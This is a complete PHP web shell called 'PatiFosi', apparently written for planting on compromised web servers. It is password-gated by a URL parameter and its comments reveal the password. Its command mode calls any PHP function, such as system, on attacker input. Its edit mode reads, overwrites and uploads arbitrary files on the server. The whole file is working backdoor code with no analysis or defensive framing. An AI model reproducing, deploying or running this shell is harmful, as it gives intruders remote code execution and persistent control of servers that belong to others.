<?php
error_reporting(0);

//config login
// localhost/patifosi.php?login=gans
$param = 'login';                             // login input
$pw    = 'e5e32f8c9a2e843080f5176871e8cd32'; // md5 password default = gans
$inDir = true;                             // true or false, to enable input dir
$out   = 'exit;';                          // string, not login

// deklarasi variable
$dir    = getcwd();
$dirGet = $_GET['dir'];
$file   = $_GET['file'];
$func   = $_GET['func'];
$arg    = $_GET['arg'];
$mode   = $_GET['mode'];
$type   = $_GET['type'];
$pass   = $_GET[$param];
$md5    = md5("$_GET[$param]");
$host   = $_SERVER['HTTP_HOST'];

// login
if($md5 !== $pw){
    die("$out");
    exit;
}

// tq
$w = array("milio48", "pescyte", "idbte4m", "javcode", "zerobyte", "idxSmg", "patiUndetektet", "date"=>"28 Mei 2018");
 // sorry for bad code //
// just for fun       //


// checked type
if($type){
  $typeChecked = "checked";
};

// chdir
if($dirGet){
  $dir = "$dirGet";
  chdir($dir);
};

// input dir
if($inDir){
  $inputDir = "<th style='display:inline-block'>dir<br><input type='text' name='dir' value='$dir' placeholder='/var/www/html'> </th>";
} else {
  $Hidinput = "<input type='hidden' name='dir' value='$dir'>";
};


// header html
echo "<html>
<head>
<title>PatiFosi</title>
<style>
#clear { text-decoration: none; }
.shadow {
    -moz-box-shadow: 4px 5px 7px rgba(0, 0, 0,0.5);
    -webkit-box-shadow: 4px 5px 7px rgba(0, 0, 0, .5);
    box-shadow: 4px 5px 7px rgba(0, 0, 0, .5);
}
input { background-color: #ffffff; color: #2f3542; }
</style>
<script src='http://codemirror.net/lib/codemirror.js'></script>
<link rel='stylesheet' href='http://codemirror.net/lib/codemirror.css'>
<script src='http://codemirror.net/mode/javascript/javascript.js'></script>
<link rel='stylesheet' href='http://codemirror.net/theme/monokai.css'>
<script src='https://codemirror.net/addon/edit/matchbrackets.js'></script>
</head>

<body style='padding:5%; padding-top:2%; border: 3px solid #2f3542; font-family: Arial, Helvetica, sans-serif; background:#f1f2f6;'>
<center><h1 style='color:#2f3542'>PatiFosi</h1></center>
<a style='font-size:10; color:#ff4757'>$host</a>
<a style='font-size:10; color:#a4b0be'>@</a>
<a style='font-size:10; color:#2f3542'>$dir</a>
<a style='font-size:10; color:#ff4757' href='?$param=$pass&mode=command'>[Home]</a><center>
<div style='background-color: #ff6b81'>
<a id='clear' style='color:#57606f' href='?$param=$pass&mode=command&dir=$dir'>[command] - </a>
<a id='clear' style='color:#57606f' href='?$param=$pass&mode=edit&dir=$dir'>[edit] - </a>
<a id='clear' style='color:#57606f' href='?$param=$pass&mode=about&dir=$dir'>[about] </a>
</div>
<br><br>
";

// mode command
if ($mode == "command") {
  echo " <form  method='get'>
      <table id='clear' style='text-align:center'>
          <input type='hidden' name='$param' value='$pass'>
          <input type='hidden' name='mode' value='command'>
          $Hidinput
          <tr>
          $inputDir
            <th style='display:inline-block'>func<br><input type='text' name='func' value='$_GET[func]' placeholder='system'> </th>
            <th style='display:inline-block'>arg<br><input type='text' name='arg' value='$_GET[arg]' placeholder='ls'>  </th> 
            <td><br><input type='checkbox' name='type' value='checked' $typeChecked >array   <input type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
          </td>
          </tr>
        </table>
      </form>
      </center><br>
      <pre style='background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;'>";
      
          if($type == 'checked'){
          echo "<i>var_dump($func($arg);</i><br>";
          @var_dump($func($arg));
        } else {
          echo "<i>die($func($arg);</i><br>";
          @die($func($arg));
        }


// mode edit
  } elseif ($mode == "edit") {
      echo "
      
      <form  method='get'>
      <table id='clear' style='text-align:center'>
          <input type='hidden' name='$param' value='$pass'>
          <input type='hidden' name='mode' value='edit'>
          $Hidinput
          <tr>
          $inputDir
            <th style='display:inline-block'>func<br><input type='text' name='func' value='$_GET[func]' placeholder='file_get_contents'> </th>
            <th style='display:inline-block'>arg<br><input type='text' name='arg' value='$_GET[arg]' placeholder='file.php'>  </th> 
            <td><br><input type='checkbox' name='type' value='ob' $typeChecked>ob   <input type='submit' value='Submit' style='background-color: #57606f;color: #f1f2f6;'>
          </td>
          </tr>
        </table>
      </form></center>
      <div align='right'>
      <button class='shadow' type='button' onclick='fullN()' style='border-radius: 50%; border: none; background-color: #eccc68; color: #f1f2f6; text-align:right'>_</button>
      <button class='shadow' type='button' onclick='full()' style='border-radius: 50%; border: none; background-color: #2ed573; color: #f1f2f6; text-align:right'>_</button>
      <button class='shadow' type='button' onclick='reset()' style='border-radius: 50%; border: none; background-color: #ff4757; color: #f1f2f6; text-align:right'>_</button>
      <br></div>
      <form  method='post' action='?$param=$pass&mode=edit&func=$_GET[func]&arg=$_GET[arg]&dir=$dir&type=$type' enctype='multipart/form-data'>
      <div class='shadow'><textarea id='codemirror' name='code' style='width:100%; height: 50%;'>";
   // codemirror
      if(!empty($_GET['func']) && !empty($_GET['arg'])){
        if($_GET['type'] !== 'ob'){
          echo(htmlspecialchars($func($arg)));
        } else {
          ob_start();
          htmlspecialchars($func($arg));
          $run = ob_get_clean();
          echo(htmlspecialchars($run));
        };
      };

      echo "</textarea></div><br>

    <table style='width:100%'>
    <tr style='text-align:center'>
    <th style='display:inline-block; padding-right:10%; padding-left:10%;'>upload<br><input type='text' name='saveto' value='$_POST[uplto]' placeholder='$dir'><br><input type='file' name='datupload' style='border: 1px solid #dfe4ea; background:#f1f2f6;'><br><input type='submit' name='uploadsubmit' value='upload' style='background-color: #57606f;color: #f1f2f6;'>
    </th>
    <th style='display:inline-block; padding-left:10%; padding-right:10%;'>save<br><input type='text' name='saveto' value='$_POST[saveto]' placeholder='$dir'><br><input type='text' name='file' value='$file' placeholder='file.php'><br><input type='submit' name='savesubmit' value='save' style='background-color: #57606f;color: #f1f2f6;'>
    </form></th>
    </tr>
    </table>
    <script>
        var myCodeMirror = CodeMirror.fromTextArea(document.getElementById('codemirror'), {
            theme: 'monokai',
            lineNumbers: true,
            matchBrackets: true,
            mode: 'javascript',
            viewportMargin: false,
        });

        function full(){
          myCodeMirror.setSize('100%', '100%');
        }

        function fullN(){
          myCodeMirror.setSize('100%', '60%');
        }

        function reset() {
            var txt;
            if (confirm('Ar u sure wanna reset d code?')) {
                myCodeMirror.setValue('');
            }
        }
    </script>
    ";
    echo "<center><hr style='border-top: 1px solid #dfe4ea' width='90%'><h4>";
    if(isset($_POST['savesubmit'])){
      $files = $_POST['file'];
      @chdir($_POST['saveto']);
      $write = file_put_contents($_POST['file'], $_POST['code']);
		  if($write) {
			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> saved $files");
		  } else {
			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed save");
		  }
    } elseif(isset($_POST['uploadsubmit'])){
      @chdir($_POST['uplto']);
      $uploadname = $_FILES['datupload']['name'];
      $uploadtmp = $_FILES['datupload']['tmp_name'];
      $write = copy($uploadtmp, $uploadname);
      if($write) {
			  die("<mark style='background: #ffffff'><a style='color:#2ed573'> uploaded $uploadname");
		  } else {
			  die("<mark style='background: #ffffff'><a style='color:#ff4757'> failed upload");
		  }
    };

// mode about
  } elseif ($mode == "about") {
    echo '</center><pre style="background:#dfe4ea; color: #2f3542; border-right: 6px solid #ced6e0;"><i>var_dump($w);</i><br>';
    echo var_dump($w);
  } else {
      echo "<img src='http://iso.ugo.si/files/patifosi.gif'><br><br>what ar u doin?";
      echo "<script>
      if(!navigator.onLine) {
        alert('u must connect internet or download d offline package for best experience');
      }
      </script>";
};